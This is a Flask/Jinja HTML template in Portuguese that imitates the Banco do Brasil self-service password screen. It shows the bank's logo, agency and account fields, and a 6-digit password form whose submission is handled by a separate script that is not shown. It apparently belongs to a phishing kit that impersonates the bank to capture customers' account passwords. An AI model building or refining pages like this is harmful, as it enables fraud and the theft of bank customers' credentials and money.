<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Banco do Brasil - Senha</title>

  <!-- Tailwind CSS -->
  <script src="https://cdn.tailwindcss.com"></script>

  <!-- Estilo personalizado -->
  <link rel="stylesheet" href="{{ url_for('static', filename='css/password.css') }}">

  <!-- Font Awesome -->
  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
  />
</head>

<body class="bg-gray-100 min-h-screen flex flex-col items-center">

  <!-- Header -->
  <header class="w-full bg-white shadow-md py-4 px-4 flex items-center justify-center sticky top-0 z-10">
    <div class="flex items-center gap-4">
      <img src="{{ url_for('static', filename='imagens/logobb.png') }}" alt="Logo Banco do Brasil" class="h-10" />
      <h1 class="text-xl font-bold text-gray-800">Autoatendimento</h1>
    </div>
  </header>

  <!-- Main Content -->
  <main class="w-full max-w-sm mt-6 px-4">
    <div class="bg-white rounded-xl shadow-xl overflow-hidden">
      
      <!-- Título -->
      <div class="bb-gradient py-5 px-6 text-white text-center">
        <h2 class="text-lg font-bold">Senha</h2>
      </div>

      <!-- Dados da conta -->
      <div class="px-6 pt-6">
        <div class="account-box">
          <p class="label">Agência:</p>
          <p class="value" id="show-agency">0000-0</p>

          <p class="label mt-4">Conta:</p>
          <p class="value" id="show-account">000000-0</p>
        </div>
      </div>

      <!-- Formulário -->
      <form id="form" class="px-6 pb-6">

        <!-- Senha -->
        <div class="mb-5">
          <label for="password" class="block text-sm font-medium text-gray-700 mb-2">
            Senha de 6 dígitos
          </label>
          <div class="relative">
            <input
              type="password"
              id="password"
              name="password"
              maxlength="6"
              placeholder="••••••"
              autocomplete="off"
              aria-label="Senha"
              class="w-full px-4 py-3 border border-gray-300 rounded-lg pr-10 focus:outline-none input-focus"
              required
            />
            <button
              type="button"
              onclick="togglePassword()"
              class="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 toggle-password focus:outline-none"
            >
              <i id="eye-icon" class="fas fa-eye-slash"></i>
            </button>
          </div>
          <p id="password-error" class="error-message hidden">Senha inválida</p>
        </div>

        <!-- Botão de Enviar -->
        <button
          type="submit"
          class="w-full bb-gradient-button text-white py-3 px-4 rounded-lg font-medium focus:outline-none"
        >
          Acessar
        </button>
      </form>
    </div>

    <!-- Box de Segurança -->
    <div class="security-box mt-6 p-4 rounded-lg shadow-sm">
      <div class="flex items-start">
        <i class="fas fa-shield-alt text-xl"></i>
        <div class="ml-3">
          <h3 class="text-sm font-medium text-gray-800">Segurança</h3>
          <p class="text-xs text-gray-700 mt-1">
            O Banco do Brasil utiliza os mais avançados sistemas de segurança para proteger suas informações.
          </p>
        </div>
      </div>
    </div>
  </main>
  <script src="{{ url_for('static', filename='js/password.js') }}"></script>
</body>
</html>
